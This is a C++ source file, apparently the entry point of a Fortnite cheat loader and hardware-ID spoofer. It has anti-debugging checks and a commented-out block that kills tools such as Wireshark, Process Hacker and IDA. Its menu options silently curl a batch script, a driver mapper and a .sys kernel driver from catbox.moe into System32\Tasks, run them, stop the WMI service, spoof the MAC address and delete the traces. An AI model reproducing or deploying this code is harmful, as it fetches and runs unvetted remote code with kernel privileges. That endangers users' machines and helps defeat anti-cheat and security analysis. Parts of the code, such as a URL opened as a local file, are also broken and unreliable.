// entrypoint.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>

#include "initalizer.hpp"

#include <dwmapi.h>

#include <iostream>
#include <iomanip>
#include <ctime>
#include <thread>
#include "auth.hpp"
#include "proc/stringproc.h"
#include "util/termcolor.h"
#include "swabra.h"
#include "encrypt.h"
#include "lazy.h"

void wait(int time)
{
    std::time_t startTime = std::time(nullptr);
    while (std::time(nullptr) < startTime + time)
    {
    }
}

void Anti_Debug_Loop()
{
    currentThreadId = GetCurrentThreadId();
    while (true)
    {
        if (IsDebuggerPresent()) *((unsigned int*)0) = 0xDEAD;

        // Assuming E decrypts to a const char*
        const char* driver1 = E("https://authvault.kesug.com");

        std::ifstream file_stream(driver1);

        if (file_stream.good())
        {

            MessageBoxA(NULL, E("HyperHide Drivers Found In Memory, Please Unload And Try Again"), E("Hydro Security"), MB_ICONINFORMATION | MB_OK);
            LI_FN(exit)(0);
            LI_FN(ExitProcess)(0);
            LI_FN(abort)();
            *((unsigned int*)0) = 0xDEAD;
        }

        if (IsDebuggerPresent()) *((unsigned int*)0) = 0xDEAD;
        EnumWindows(EnumWindowsProc, 0);

        wait(1);
    }
}

using namespace KeyAuth;

// copy and paste from https://keyauth.cc/app/ and replace these string variables



int main()
{
    /*thread(Anti_Debug_Loop).detach();

    system("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1");
    system("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1");
    system("sc stop HTTPDebuggerPro >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq fiddler*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq wireshark*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq rawshark*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq charles*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq ida*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1");
    system("sc stop HTTPDebuggerPro >nul 2>&1");
    system("sc stop KProcessHacker3 >nul 2>&1");
    system("sc stop KProcessHacker2 >nul 2>&1");
    system("sc stop KProcessHacker1 >nul 2>&1");
    system("sc stop wireshark >nul 2>&1");
    system("sc stop npf >nul 2>&1");	system("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1");
    system("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1");
    system("sc stop HTTPDebuggerPro >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq fiddler*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq wireshark*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq rawshark*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq charles*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq ida*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1");
    system("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1");
    system("sc stop HTTPDebuggerPro >nul 2>&1");
    system("sc stop KProcessHacker3 >nul 2>&1");
    system("sc stop KProcessHacker2 >nul 2>&1");
    system("sc stop KProcessHacker1 >nul 2>&1");
    system("sc stop wireshark >nul 2>&1");
    system("sc stop npf >nul 2>&1");*/

    std::string consoleTitle = pr("CORRUPTED SERVICES | FORTNITE SLOTTED").decrypt();
    SetConsoleTitleA(consoleTitle.c_str());


    //KeyAuthApp.init();
    //if (!KeyAuthApp.response.success)
    //{
    //    std::cout << pr("\n Status: ") << KeyAuthApp.response.message;
    //    Sleep(1500);
    //    exit(1);
    //}

    //keyauth();
    system("cls");

    std::cout << pr("\n\n [1] Temp Spoof\n [2] Load Driver \n [3] Launch Cheeto\n\n Choose option: ");

    int option;


    std::cin >> option;
    switch (option)
    {
    case 1:
        system("curl --silent https://files.catbox.moe/gv7xzv.bat --output C:\\Windows\\System32\\Tasks\\mac.bat >nul 2>&1");
        system("curl --silent https://files.catbox.moe/z2eo5p.bin --output C:\\Windows\\System32\\Tasks\\mapper.exe >nul 2>&1");
        system("curl --silent https://files.catbox.moe/pzfx2g.sys --output C:\\Windows\\System32\\Tasks\\s4fg4.sys >nul 2>&1");

        system("C:\\Windows\\System32\\Tasks\\mapper.exe C:\\Windows\\System32\\Tasks\\s4fg4.sys");
        system("net stop winmgmt /y");


        std::cout << "[i] Spoofing Finished [1/1]\n";
        Sleep(1500);
        std::cout << "[i] Spoofing MAC\n";
        system("C:\\Windows\\System32\\Tasks\\mac.bat >nul 2>&1");
        std::cout << "[i] MAC Successfully Spoofed\n";

        std::remove(" C:\\Windows\\System32\\Tasks\\mac.bat");
        std::remove("C:\\Windows\\System32\\Tasks\\mapper.exe");
        std::remove("C:\\Windows\\System32\\Tasks\\s4fg4.sys");

        Beep(500, 500);


        main();
    case 2:


        system("curl --silent https://files.catbox.moe/0lobra.bin --output C:\\Windows\\System32\\Tasks\\mapper.exe >nul 2>&1");

        system("C:\\Windows\\System32\\Tasks\\mapper.exe");

        std::remove("C:\\Windows\\System32\\Tasks\\mapper.exe");


        std::cout << "[i] Driver Now Loaded \n";

        Beep(500, 500);
        main();

    case 3:

        HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);

        Sleep(1000);
        std::string license;
        SetConsoleTextAttribute(h, 5);
        std::cout << "[";
        SetConsoleTextAttribute(h, 15);
        std::cout << "+";
        SetConsoleTextAttribute(h, 5);
        std::cout << "]";

        SetConsoleTextAttribute(h, 15);


        initialize();
    }


    system("pause");
}